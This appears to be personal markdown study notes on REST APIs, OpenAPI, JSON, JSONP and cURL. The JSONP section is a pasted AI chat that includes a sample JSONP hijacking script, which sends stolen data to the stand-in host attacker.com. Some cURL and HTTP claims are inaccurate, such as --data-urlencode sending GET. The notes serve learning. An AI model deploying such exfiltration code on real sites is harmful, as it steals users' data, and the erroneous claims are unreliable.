# INDEX

- [INDEX](#index)
- [API Endpoint](#api-endpoint)
- [Routes of API](#routes-of-api)
- [API payload](#api-payload)
- [RESTful APIs](#restful-apis)
  - [Example of a RESTful API](#example-of-a-restful-api)
  - [Uses of REST APIs](#uses-of-rest-apis)
  - [Caching in REST APIs](#caching-in-rest-apis)
- [OpenAPI](#openapi)
  - [The OpenAPI specification](#the-openapi-specification)
  - [Diff. b/w OpenAPI specification and OpenAPI definition](#diff-bw-openapi-specification-and-openapi-definition)
  - [How are OpenAPI definitions of REST APIs useful for developers?](#how-are-openapi-definitions-of-rest-apis-useful-for-developers)
    - [Improved API discovery](#improved-api-discovery)
    - [Consistency](#consistency)
    - [Code generation](#code-generation)
    - [Improved documentation](#improved-documentation)
    - [Testing](#testing)
  - [An example OpenAPI definition](#an-example-openapi-definition)
    - [In JSON](#in-json)
    - [In YAML](#in-yaml)
- [API request: HTTP response codes (TODO: complete)](#api-request-http-response-codes-todo-complete)
- [JSON](#json)
  - [Structuring JSON Data](#structuring-json-data)
    - [Use a consistent naming convention](#use-a-consistent-naming-convention)
    - [Keep it simple](#keep-it-simple)
    - [Use arrays for lists](#use-arrays-for-lists)
    - [Use objects for nested data](#use-objects-for-nested-data)
    - [Use a single root element](#use-a-single-root-element)
    - [Use meaningful keys](#use-meaningful-keys)
  - [Meaning of `application/json` in the context of APIs (MIME types)](#meaning-of-applicationjson-in-the-context-of-apis-mime-types)
  - [Why are comments not allowed in JSON?](#why-are-comments-not-allowed-in-json)
- [JSONP (TODO)](#jsonp-todo)
  - [Can servers disallow jsonp?](#can-servers-disallow-jsonp)
- [`cURL` command explained](#curl-command-explained)
- [Server-Side API Caching](#server-side-api-caching)

# API Endpoint

Endpoints are functions available through the API. This can be things like retrieving the API index, updating a post, or deleting a comment. Endpoints perform a specific function, taking some number of parameters and return data to the client.

# Routes of API

A route is the “name” you use to access [endpoints](#api-endpoint), used in the URL. A route can have multiple endpoints associated with it, and which is used depends on the HTTP verb (`GET`, `POST`, `DELETE`).

For example, with the URL `http://example.com/wp-json/wp/v2/posts/123`:

The “route” is `wp/v2/posts/123` – The route doesn’t include `wp-json` because `wp-json` is the base path for the API itself.

This route has 3 endpoints:
- `GET` triggers a `get_item` method, returning the post data to the client.
- `PUT` triggers an `update_item` method, taking the data to update, and returning the updated post data.
- `DELETE` triggers a `delete_item` method, returning the now-deleted post data to the client.

3 different concepts here:

- Resource: `{id: 42, type: employee, company: 5}`
- Route: `localhost:8080/employees/42`
- Endpoint: `GET localhost:8080/employees/42`

It is possible to have different endpoints for the same route, such as `DELETE localhost:8080/employees/42`. So endpoints are basically actions.

Also you can access the same resource by different routes such as `localhost:8080/companies/5/employees/42`. So a route is a way to locate a resource.

# API payload

In computer programming, various apps an systems share data and information regularly over the internet. When each unit of data is transmitted, it has 2 essential parts:
- Header/overhead identifier

    - The overhead/header data is used as an identifier, and its sole purpose is **to indicate** the *source* and *destination* of the information being transmitted.

    - This section of the data is striped off once the message reaches its destination.

- Payload
    - The payload refers to an integral part of each unit of data being transmitted.

    - This is the part of the unit data that carries *the real message* that **an app or system needs for it to act**.

A ***payload*** *in the context of APIs* is the actual data pack that is sent with the `GET` method in `HTTP`. 

It is the crucial information that you submit to the server when you are making an API request. 

The payload can be sent or received in various formats, including `JSON`. Usually, the payload is denoted using the `{}` in a query string.

Payload = “{}”

---

# RESTful APIs

If you wish to learn what exactly REST is, go [here](../Networking/README.md#rest).

In simple words, a RESTful API is an API that conforms to certain constraints, such as using HTTP methods (like GET, POST, PUT, DELETE) to interact with resources, and returning data in a standardized format (such as JSON).

REST APIs are always built on top of HTTP.

A RESTful API typically has a set of endpoints, which are URLs that represent specific resources. For example, an API for managing users may have:
- an endpoint for creating a new user (e.g. `POST /users`) and;
- an endpoint for retrieving a list of all users (e.g. `GET /users`). 
 
Each endpoint typically supports a set of HTTP methods (e.g. GET, POST, PUT, DELETE) that correspond to different actions that can be performed on the resource. The data exchanged between the client and server is typically in the form of JSON or XML.

## Example of a RESTful API

A simple example of an HTTP API would be a weather service that provides current weather information for a given location. This service might define an endpoint such as `api.weather.com/current?location=New+York`, which the client can access via an HTTP `GET` request to retrieve the current weather conditions for New York City.

## Uses of REST APIs

REST APIs are used in a wide variety of contexts, from simple web-based apps to complex enterprise systems. They are a popular choice for building modern, scalable, and maintainable systems because they are easy to understand and use, and can be consumed by a wide variety of client applications.

Additionally, REST APIs are also commonly used in **Microservices architecture**, where different services are developed and deployed independently and communicate via APIs, this way each service can evolve and be scaled independently.

> ***Note***: There are other architectural styles for building APIs, such as SOAP (Simple Object Access Protocol) based APIs, but HTTP APIs are the most widely used.

## Caching in REST APIs

Being cacheable is one of the architectural constraints of REST.

- `GET` requests should be cachable by default – until a special condition arises. Usually, browsers treat all `GET` requests as cacheable.
- `POST` requests are not cacheable by default – but can be made cacheable if either an `Expires` header or a `Cache-Control` header with a directive, to explicitly allows caching, is added to the response.
- Responses to `PUT` and `DELETE` requests are not cacheable at all.

---

# OpenAPI

## The OpenAPI specification

OpenAPI is an open-source initiative that provides a standard, language-agnostic way to describe the functionality of a RESTful API. 

The ***OpenAPI specification*** defines how to describe the structure of an API, including its endpoints, request and response formats, and the data types used.

The OpenAPI specification is a machine-readable format, which means that it can be used to generate code, documentation, and other artifacts automatically. This helps to reduce the amount of manual work required to create an API, and makes it easier to keep the API documentation up-to-date as the API evolves over time.

OpenAPI is widely used by organizations of all sizes, from small startups to large enterprises, to define and document their APIs. It is supported by many API development and testing tools, and is becoming increasingly popular as a standard for API development.

## Diff. b/w OpenAPI specification and OpenAPI definition

- The OpenAPI specification *DEFINES HOW* to describe an API.
- An OpenAPI definition corresponds to a particular API, and follows the OpenAPI specification for describing the behavior of that API.

## How are OpenAPI definitions of REST APIs useful for developers?

OpenAPI definitions of REST APIs are useful for developers in several ways:

### Improved API discovery

OpenAPI definitions provide a comprehensive description of the available endpoints, request and response formats, and data types used by an API. This makes it easier for developers to understand what an API can do, and how to use it effectively.

### Consistency

The OpenAPI specification provides a standard set of rules and guidelines for documenting APIs, which helps to ensure consistency between APIs. This makes it easier for developers to understand and integrate with different APIs, as they can rely on a common set of conventions.

### Code generation

The machine-readable nature of OpenAPI definitions makes it possible to generate code automatically, which can help to reduce the amount of manual work required to create and maintain an API.

### Improved documentation

OpenAPI definitions can be used to generate API documentation automatically, which helps to keep the documentation up-to-date as the API evolves over time. This makes it easier for developers to find the information they need when working with an API.

### Testing

OpenAPI definitions can be used to validate that an API implementation is correct and meets the specifications defined in the OpenAPI definition. This can help to catch problems early in the development process, before the API is deployed to production.

---


## An example OpenAPI definition

A simple OpenAPI definition looks like this:

```yaml
openapi: 3.0.0
info:
  version: 1.0.0
  title: Sample API
  description: A sample API to illustrate OpenAPI concepts
paths:
  /list:
    get:
      description: Returns a list of stuff              
      responses:
        '200':
          description: Successful response
```


Here's a simple example of an OpenAPI definition for a REST API that allows users to retrieve a list of books:

---

### In JSON

```json
{
  "openapi": "3.0.0",
  "info": {
    "title": "Book API",
    "version": "1.0.0"
  },
  "servers": [
    {
      "url": "https://api.example.com/books"
    }
  ],
  "paths": {
    "/books": {
      "get": {
        "description": "Retrieve a list of books",
        "responses": {
          "200": {
            "description": "Success",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          }
        }
      }
    }
  }
}
```

### In YAML

```yaml
openapi: 3.0.0
info:
  title: Book API
  version: 1.0.0
servers:
  - url: https://api.example.com/books
paths:
  /books:
    get:
      description: Retrieve a list of books
      responses:
        200:
          description: Success
          content:
            application/json:
              schema:
```

---

In this example, the API definition specifies:
- The API endpoint (`/books`)
- The HTTP method used to retrieve a list of books (`GET`), and 
- The response format (`application/json`). 

The `schema` property is used to define the structure of the JSON response data.

---

# API request: HTTP response codes (TODO: complete)

HTTP status codes are generated by the server that's hosting the site when it responds to a request made by a client, for example a browser or a crawler. 

Every HTTP status code has a different meaning, but often the outcome of the request is the same. For example, there are multiple status codes that signal redirection, but their outcome is the same.

Resp

# JSON

## Structuring JSON Data

When structuring JSON data, it's important to keep in mind that JSON is a hierarchical format, meaning that it has a tree-like structure with nested elements. Here are a few guidelines for structuring JSON data:

### Use a consistent naming convention

Choose a naming convention and stick to it throughout the JSON data. This will make it easier to understand and navigate the data.

### Keep it simple

Avoid complex nesting and use only the necessary elements to make the data easy to read and understand.

### Use arrays for lists

Use arrays to represent lists of items, and use objects to represent individual items within those lists.

### Use objects for nested data

Use objects to represent nested data, such as an object containing multiple properties.

### Use a single root element

Use a single root element to contain all the data, making it easy to identify and access the data.

### Use meaningful keys

Use keys that are meaningful and easy to understand.

---

Here is an example of well-structured JSON data:

```json
{
    "employees": [
        {
            "firstName": "John",
            "lastName": "Doe",
            "age": 30,
            "address": {
                "streetAddress": "21 2nd Street",
                "city": "New York",
                "state": "NY",
                "postalCode": "10021"
            },
            "phoneNumbers": [
                {
                    "type": "home",
                    "number": "212 555-1234"
                },
                {
                    "type": "fax",
                    "number": "646 555-4567"
                }
            ]
        },
        {
            "firstName": "Anna",
            "lastName": "Smith",
            "age": 32,
            "address": {
                "streetAddress": "21 3nd Street",
                "city": "Los Angeles",
                "state": "CA",
                "postalCode": "10021"
            },
            "phoneNumbers": [
                {
                    "type": "home",
                    "number": "310 555-1234"
                },
                {
                    "type": "fax",
                    "number": "646 555-4567"
                }
            ]
        }
    ]
}
```

It's clear to see that the data is structured in a way that makes it easy to understand and navigate. The keys are meaningful, the data is not overly nested, and there's a single root element.

## Meaning of `application/json` in the context of APIs (MIME types)

`application/json` is a media type, also known as a MIME type, used to specify the format of data being sent in an API request or response. The `application/json` media type indicates that the data is formatted as a JSON object.

> ***Note***: Read more about ***MIME types*** under the Swagger 2 spec documentation [here](https://swagger.io/docs/specification/2-0/mime-types/).

There are alternative media types that can be used in APIs, depending on the specific needs of the API and the data being exchanged. Some of the most common alternatives include:

- `application/xml`: Indicates that the data is formatted as an XML document.
- `application/x-www-form-urlencoded`: Indicates that the data is formatted as a series of key-value pairs, typically used in HTML forms.
- `text/plain`: Indicates that the data is plain text, with no specific formatting.

It's worth noting that while different media types can be used in APIs, `application/json` is a very common choice due to its simplicity, support for a wide range of data types, and widespread support in programming languages and tooling.

## Why are comments not allowed in JSON?

Comments are not allowed in JSON because the JSON format was designed to be a lightweight data interchange format, and allowing comments would add unnecessary complexity and make it more difficult to parse. 

JSON was derived from JavaScript object notation, which does support comments, but the creators of JSON intentionally removed this feature to make it a more strict and unambiguous format for data exchange.

---

# JSONP (TODO)

what is jsonp
JSONP (JSON with Padding) is a technique used to overcome the same-origin policy limitations of web browsers when loading data from a different domain. The same-origin policy is a security feature that prevents a web page from making requests to a different domain than the one that served the web page.

JSONP works by adding a script tag to the web page, with the src attribute set to the URL of the JSON data on the other domain. The server providing the JSON data wraps the data in a JavaScript function call, and the browser executes the script as if it were any other script on the page, allowing the JSON data to be accessed.

JSONP is generally considered less secure than other methods for loading data from a different domain, such as CORS (Cross-Origin Resource Sharing), and it is not recommended to use it in new developments. JSONP is mainly used in legacy codebase and it is not supported by all browsers.



Rohan Verma
how exactly does jsonp work
JSONP works by adding a script tag to the web page, with the src attribute set to the URL of the JSON data on the other domain. The browser then sends a request to the server for the JSON data, but instead of returning the data in the usual JSON format, the server wraps the data in a JavaScript function call.

When the browser receives the response, it treats it as a script and executes the function call. The JSON data is passed as an argument to the function, and is available to the web page's JavaScript code.

For example, if a web page wants to load JSON data from a server at "http://example.com/data.json", it would add a script tag to the page with the src attribute set to "http://example.com/data.json?callback=parseData". The server would then return the JSON data wrapped in a function call like this: "parseData({'key':'value'});"

When the browser receives this response, it would execute the parseData function and pass the JSON data to it. The parseData function can then access the JSON data and use it as needed.

JSONP is mainly used for loading data from a different domain, where it is not possible to use XMLHttpRequest or similar techniques due to the same-origin policy limitations. However, it's important to note that JSONP is less secure than other methods such as CORS, because it allows arbitrary script to be executed in the user's browser, thus it is not recommended to use it in new developments.




Rohan Verma
How does JSONP not violate same origin policy
JSONP does not violate the same-origin policy because the data is not being accessed directly by the web page's JavaScript code. The same-origin policy prevents a web page from making requests to a different domain than the one that served the web page. However, JSONP works by adding a script tag to the web page, with the src attribute set to the URL of the JSON data on the other domain. This is allowed by the same-origin policy because a script tag is considered a safe method of including resources from other domains.

When the browser receives the response containing the JSONP wrapped data, it treats it as a script and executes the function call. The JSON data is passed as an argument to the function, and is available to the web page's JavaScript code.

However, it's important to note that JSONP is less secure than other methods such as CORS, because it allows arbitrary script to be executed in the user's browser. JSONP is mainly used for loading data from a different domain, and it is not recommended to use it in new developments, CORS is a more secure way and is supported by most of the browser.




Rohan Verma
Example of javascript that same origin policy will block
An example of JavaScript that would be blocked by the same-origin policy would be a script that attempts to make an XMLHttpRequest (or similar) to a different domain than the one that served the web page.

For example, if a web page is served from "http://example.com", a script on that page that attempts to make an XMLHttpRequest to "http://other-domain.com/data.json" would be blocked by the browser due to the same-origin policy.

Here's an example of a JavaScript code that would be blocked by the same-origin policy:

Copy code
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://other-domain.com/data.json", true);
xhr.send();
This script attempts to make a GET request to "http://other-domain.com/data.json" using the XMLHttpRequest object, but the browser would block the request because "http://other-domain.com" is a different domain than "http://example.com" which served the web page.

However, if the script uses JSONP, it will be able to load the data, because JSONP uses script tags which are allowed by the same-origin policy.




Rohan Verma
Example of malicious js code that uses jsonp
Here is an example of malicious JavaScript code that uses JSONP to exploit a vulnerability on a website:

Copy code
// The attacker's server
function attackerCode(data) {
  // Send the data to the attacker's server
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "http://attacker.com/steal-data", true);
  xhr.send(data);
}

// The malicious code
var script = document.createElement("script");
script.src = "http://vulnerable-site.com/data.json?callback=attackerCode";
document.body.appendChild(script);
This script creates a script tag that points to a JSONP endpoint on "http://vulnerable-site.com", and sets the callback function to be the attackerCode function. When the browser loads the script, it will execute the attackerCode function, which will send the data from the vulnerable site to the attacker's server.

This type of attack is possible because JSONP allows arbitrary JavaScript code to be executed in the user's browser, and it can be used to steal sensitive information from the user, such as session cookies, login credentials, and other sensitive data. It's important to note that JSONP is less secure than other methods such as CORS, and it is not recommended to use it in new developments.




Rohan Verma
callback query parameter
!
The callback query parameter is used in JSONP to specify the callback function that will be executed when the browser receives the JSON data. When making a JSONP request, the callback function is passed as a query parameter to the URL of the JSON data. The server then wraps the JSON data in a call to the specified callback function, and the browser executes the function call.

For example, if a web page wants to load JSON data from a server at "http://example.com/data.json", it would add a script tag to the page with the src attribute set to "http://example.com/data.json?callback=parseData". The server would then return the JSON data wrapped in a function call like this: "parseData({'key':'value'});"

When the browser receives this response, it would execute the parseData function and pass the JSON data to it. The parseData function can then access the JSON data and use it as needed.

It's important to note that the use of callback query parameter does not guarantee security, and JSONP can be used to steal sensitive information from the user, such as session cookies, login credentials, and other sensitive data. It's recommended to use other methods such as CORS, which is more secure and it is supported by most of the browser.

This content may violate our content policy. If you believe this to be in error, please submit your feedback — your input will aid our research in this area.


## Can servers disallow jsonp?

Yes, websites can disallow JSONP requests by not including the necessary code on the server to handle the callback query parameter.

For example, the server could be configured to only respond to requests that do not include a callback query parameter, or it could be programmed to check the origin of the request and only allow requests from specific domains. This would prevent a malicious script from making a JSONP request to the site and executing malicious code.

Another way to disallow JSONP requests is to use the ***Content Security Policy*** (CSP) header. CSP is a security feature that allows a site to specify which sources of content are allowed to be loaded by a browser. CSP can be used to block the loading of scripts from specific domains, or block the use of the callback query parameter altogether.

It's important to note that JSONP is less secure than other methods such as CORS, and it is not recommended to use it in new developments. Disallowing JSONP requests can help to prevent security vulnerabilities and protect sensitive user data.

---

# `cURL` command explained

cURL, which stands for "client URL"; is a command-line tool that is used to transfer data over a network. 

It supports a wide variety of protocols, including `HTTP`, `HTTPS`, `FTP`, `SFTP`, and more. cURL provides a number of options and flags that can be used to customize the behavior of the tool. Here are a few commonly used cURL flags:

- `-X` or `--request`: This flag specifies the type of request to make. For example, to make a `GET` request, you would use `-X GET`.
- `-d` or `--data`: This flag is used to include data in the body of a request. The data can be specified as a string, or as a file by prefixing the file name with an `@` symbol.
    
    ---

  1. `@` symbol
  
      When using the `-d` flag with `@`, cURL will read the data from the specified file and send it in the request body.
    
        The `@` symbol is followed by the file path.

        For example, if you have a file called `data.json` that contains the following JSON:
        ```json
        {
            "name": "John Doe",
            "email": "johndoe@example.com"
        }
        ```
        You could use the following command to send a POST request to an endpoint, with the contents of the "data.json" file in the request body:

        ```bash
        curl -X POST -H "Content-Type: application/json" -d @data.json http://example.com/endpoint
        ```

    ---

  2. `--data-urlencode` instead of `-d`

        ```bash
        curl --data-urlencode "param1=value1&param2=value2" http://example.com/endpoint
        ```
        This command will send a `GET` request to the specified endpoint with the parameters in the request body.

    ---

- `-H` or `--header`: This flag is used to include a custom header in the request. For example, to include an "Authorization" header, you would use -H "Authorization: Bearer YOUR_TOKEN".
- `-u` or `--user`: This flag is used to include a user name and password for basic authentication in the request. The user name and password should be separated by a colon, and should be preceded by the word "basic".
- `-i` or `--include`: This flag includes the HTTP headers in the output.
- `-F` or `--form`: This flag is used to send data in the request body as a **multipart/form-data**. 
    
    ---

    1. This is the format commonly used for sending files and other data in HTML forms. 
    
        The flag takes the form of a **key-value pair**, where the key is the name of the form field and the value is the data to send.

        For example, if you want to send a file called `image.jpg` as a form field called `file`, you could use the following command:

        ```bash
        curl -F "file=@image.jpg" http://example.com/upload
        ```
    
        This command sends a `file` field with the contents of the `image.jpg` file to the specified endpoint.

    ---

    2. You can also send multiple fields in the request, for example:

        ```bash
        curl -F "file=@image.jpg" -F "name=John Doe" -F "email=johndoe@example.com" http://example.com/upload
        ```        
        This command sends:
        -  a `file` field with the contents of the `image.jpg` file, 
        -  a `name` field with the value `John Doe` and;
        -  an `email` field with the value `johndoe@example.com` *to the specified endpoint*.

    ---

    3. The `--form-string` flag to send data as ***plain text***:

        ```bash
        curl --form-string "name=John Doe" --form-string "email=johndoe@example.com" http://example.com/upload
        ```
    
    ---

- `-L` or `--location`: This flag follows redirects. It will automatically follow redirections sent by the server.
- `-o` or `--output`: This flag writes the output to a file instead of stdout.


Here is an example of how cURL might be used to make a `POST` request to an [API endpoint](#api-endpoint), including a JSON payload in the request body, and an `"Authorization"` header with a Bearer token:
```bash
curl -X POST https://api.example.com/data \
-H "Content-Type: application/json" \
-H "Authorization: Bearer YOUR_TOKEN" \
-d '{"key":"value"}'
```
This command makes a POST request to the specified URL, with a `"Content-Type"` header set to `"application/json"` and an `"Authorization"` header set to the provided token. 
It also includes a JSON payload in the request body.

> ***Note***: When sending sensitive data, such as passwords or API keys, over the network, it's best to use `HTTPS` to encrypt the data in transit.

# Server-Side API Caching


